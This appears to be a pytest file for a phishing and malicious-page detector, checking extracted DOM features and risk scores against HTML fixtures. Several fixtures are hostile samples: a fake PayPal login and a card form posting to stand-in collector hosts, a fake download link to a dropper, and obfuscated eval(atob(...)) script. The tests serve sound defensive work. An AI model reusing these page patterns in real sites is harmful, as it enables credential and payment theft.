import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.dom_features import evaluate_credential_and_payment_risk, extract_dom_features_from_html


def test_normal_first_party_login_form():
    html = """
    <html><head><title>Aurora Portal - Sign In</title></head>
    <body>
      <form method="post" action="/auth/login">
        <input type="email" name="email"/>
        <input type="password" name="password"/>
        <button type="submit">Sign In</button>
      </form>
      <footer>support@aurora.example.com | Copyright Aurora</footer>
    </body></html>
    """
    dom = extract_dom_features_from_html("https://aurora.example.com/login", html)
    assert dom["num_password_fields"] == 1
    assert dom["has_external_form_action"] == 0
    assert dom["has_official_contact_cue"] == 1
    cp = evaluate_credential_and_payment_risk("https://aurora.example.com/login", dom)
    assert cp["credential_risk_score"] == 0.0


def test_external_credential_submission():
    html = """
    <html><head><title>PayPal Verify Account</title></head>
    <body>
      <form method="post" action="https://steal-creds.evil.example.top/collect">
        <input type="hidden" name="a"/><input type="hidden" name="b"/><input type="hidden" name="c"/>
        <input type="email" name="user"/>
        <input type="password" name="pass"/>
        <button type="submit">Verify</button>
      </form>
    </body></html>
    """
    dom = extract_dom_features_from_html("https://paypal-security-verify.example.xyz/login", html)
    assert dom["has_external_form_action"] == 1
    assert dom["brand_domain_mismatch"] == 1
    cp = evaluate_credential_and_payment_risk("https://paypal-security-verify.example.xyz/login", dom)
    assert cp["credential_risk_score"] >= 0.85


def test_cross_origin_iframes_and_external_scripts():
    html = """
    <html><head><title>Tech Blog</title>
      <script src="https://cdn.example.net/bundle.js"></script>
      <script src="https://ads.example.org/ad.js"></script>
    </head><body>
      <iframe src="https://ads.example.org/frame1" width="300" height="250"></iframe>
      <iframe src="https://ads.example.org/frame2" width="300" height="250"></iframe>
      <p>Normal article content.</p>
    </body></html>
    """
    dom = extract_dom_features_from_html("https://techblog.example.com/post/1", html)
    assert dom["num_iframes"] == 2
    assert dom["num_external_scripts"] == 2
    assert dom["cross_origin_iframes_uninspected"] == 2
    assert any("cross_origin_iframe_dom" in x for x in dom["unavailable_signals"])


def test_fake_download_and_obfuscated_js():
    html = """
    <html><head><title>Free Download</title>
      <script>
        var x = eval(atob("YWxlcnQoMSk="));
        var s = document.createElement('script');
      </script>
    </head><body>
      <a href="https://dropper.example.xyz/Setup.exe">Click to Download Free Download</a>
      <button>Start Download</button>
    </body></html>
    """
    dom = extract_dom_features_from_html("https://get-codec.example.top/", html)
    assert dom["fake_download_button_count"] >= 2
    assert dom["suspicious_inline_js_count"] >= 2
    assert dom["dynamic_dom_mutation_count"] >= 1


def test_redirect_indicators_and_payment_form():
    html = """
    <html><head><title>Flash Checkout</title>
      <meta http-equiv="refresh" content="2;url=https://other.example.icu/pay"/>
      <script>window.location.href="https://other.example.icu/pay";</script>
    </head><body>
      <p>Pay now via UPI. Store credit only, no refund.</p>
      <form method="post" action="https://skimmer.example.icu/card">
        <input type="text" name="card_number"/>
        <input type="text" name="cvv"/>
      </form>
    </body></html>
    """
    dom = extract_dom_features_from_html("https://deals.example.shop/checkout", html)
    assert dom["meta_refresh_redirects"] == 1
    assert dom["js_redirect_indicators"] == 1
    assert dom["has_suspicious_payment_dest"] == 1
    assert dom["has_restrictive_refund_terms"] == 1
    cp = evaluate_credential_and_payment_risk("https://deals.example.shop/checkout", dom)
    assert cp["payment_risk_score"] >= 0.70

